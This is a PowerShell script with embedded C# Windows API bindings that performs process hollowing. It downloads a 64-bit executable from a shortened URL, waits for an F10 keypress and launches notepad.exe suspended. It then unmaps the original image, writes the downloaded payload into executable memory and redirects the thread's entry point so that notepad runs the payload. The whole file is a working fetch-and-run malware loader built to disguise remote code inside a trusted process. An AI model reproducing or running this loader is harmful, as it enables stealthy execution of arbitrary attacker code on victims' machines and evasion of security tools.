Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Native {
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT64 {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;
        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;
        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
        public byte[] DummyBytes;
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead
    );

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("ntdll.dll", SetLastError=true)]
    public static extern uint NtUnmapViewOfSection(
        IntPtr hProcess,
        IntPtr baseAddress
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool GetThreadContext(
        IntPtr hThread,
        ref CONTEXT64 lpContext
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool SetThreadContext(
        IntPtr hThread,
        ref CONTEXT64 lpContext
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(
        IntPtr hThread
    );
}
"@ -Language CSharp

Add-Type -AssemblyName System.Windows.Forms

function Wait-ForKey {
    param([string]$key)
    Write-Host "[*] Waiting for key $key press..."
    while ($true) {
        Start-Sleep -Milliseconds 100
        if ([System.Windows.Forms.Control]::IsKeyLocked($key) -or [System.Windows.Forms.Control]::ModifierKeys -eq [System.Windows.Forms.Keys]::$key) {
            break
        }
    }
}

# CONFIG
$exeUrl = "https://tinyurl.com/mwr259jv"

Write-Host "[*] Downloading 64-bit payload..."
$payloadBytes = Invoke-WebRequest $exeUrl -UseBasicParsing
$peBytes = $payloadBytes.Content

# Convert content (byte array) directly
if ($peBytes -isnot [byte[]]) {
    $peBytes = [System.Text.Encoding]::ASCII.GetBytes($peBytes)
}

Write-Host "[*] Waiting for F10 to inject..."
while ($true) {
    Start-Sleep -Milliseconds 100
    # F10 key check
    $vkCode = 0x79
    $state = [System.Windows.Forms.Control]::IsKeyLocked('F10') # Actually, IsKeyLocked won't work well for F10, use GetAsyncKeyState instead below.
    # Instead, import GetAsyncKeyState
    Add-Type @"
    using System.Runtime.InteropServices;
    public class Keyboard {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);
    }
"@
    if ([Keyboard]::GetAsyncKeyState($vkCode) -band 0x8000) { break }
}

$si = New-Object Native+STARTUPINFO
$pi = New-Object Native+PROCESS_INFORMATION
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)

Write-Host "[*] Launching notepad suspended..."
$CREATE_SUSPENDED = 0x4
$result = [Native]::CreateProcess("C:\Windows\System32\notepad.exe", $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, $CREATE_SUSPENDED, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
if (!$result) { Write-Error "[-] Failed to create process"; exit }

$ctx = New-Object Native+CONTEXT64
$ctx.ContextFlags = 0x100000 | 0x1F # CONTEXT_ALL

[Native]::GetThreadContext($pi.hThread, [ref]$ctx) | Out-Null

# Read base image address from PEB (Rdx+0x10)
$buffer = New-Object byte[] 8
$bytesRead = [IntPtr]::Zero
$pebImageBaseAddressPtr = [IntPtr]::Add([IntPtr]$ctx.Rdx, 0x10)
[Native]::ReadProcessMemory($pi.hProcess, $pebImageBaseAddressPtr, $buffer, 8, [ref]$bytesRead) | Out-Null
$imageBase = [BitConverter]::ToUInt64($buffer, 0)

# Unmap the original executable image
[Native]::NtUnmapViewOfSection($pi.hProcess, [IntPtr]$imageBase) | Out-Null

# Parse PE headers to get SizeOfImage, SizeOfHeaders, EntryPoint, and NumberOfSections
# DOS header e_lfanew offset = 0x3C (4 bytes)
$e_lfanew = [BitConverter]::ToInt32($peBytes, 0x3C)
# PE header offset
$peHeaderOffset = $e_lfanew
# SizeOfImage (DWORD) at PE header + 0x50
$sizeOfImage = [BitConverter]::ToUInt32($peBytes, $peHeaderOffset + 0x50)
# SizeOfHeaders (DWORD) at PE header + 0x54
$sizeOfHeaders = [BitConverter]::ToUInt32($peBytes, $peHeaderOffset + 0x54)
# AddressOfEntryPoint (DWORD) at PE header + 0x28
$entryPointRVA = [BitConverter]::ToUInt32($peBytes, $peHeaderOffset + 0x28)
# NumberOfSections (WORD) at PE header + 0x6
$numberOfSections = [BitConverter]::ToUInt16($peBytes, $peHeaderOffset + 0x6)
# Section headers start right after PE header + size of standard fields
$sectionHeadersStart = $peHeaderOffset + 0xF8

# Allocate memory in remote process
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40
$remoteBase = [Native]::VirtualAllocEx($pi.hProcess, [IntPtr]$imageBase, $sizeOfImage, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)

if ($remoteBase -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to allocate memory in remote process."
    exit
}

# Write PE Headers
$bytesWritten = [IntPtr]::Zero
[Native]::WriteProcessMemory($pi.hProcess, $remoteBase, $peBytes, $sizeOfHeaders, [ref]$bytesWritten) | Out-Null

# Write sections
for ($i = 0; $i -lt $numberOfSections; $i++) {
    $sectionOffset = $sectionHeadersStart + ($i * 0x28)
    $virtualAddress = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x0C)
    $sizeOfRawData = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x10)
    $pointerToRawData = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x14)

    if ($sizeOfRawData -eq 0) { continue }

    $sectionData = $peBytes[$pointerToRawData..($pointerToRawData + $sizeOfRawData - 1)]

    [Native]::WriteProcessMemory($pi.hProcess, [IntPtr]::Add($remoteBase, $virtualAddress), $sectionData, $sizeOfRawData, [ref]$bytesWritten) | Out-Null
}

# Set thread context RIP to entry point
$ctx.Rip = [UInt64]::op_Explicit([IntPtr]::Add($remoteBase, $entryPointRVA))

[Native]::SetThreadContext($pi.hThread, [ref]$ctx) | Out-Null

# Resume thread
[Native]::ResumeThread($pi.hThread) | Out-Null

Write-Host "[+] Hollowing complete! notepad.exe is running your payload."
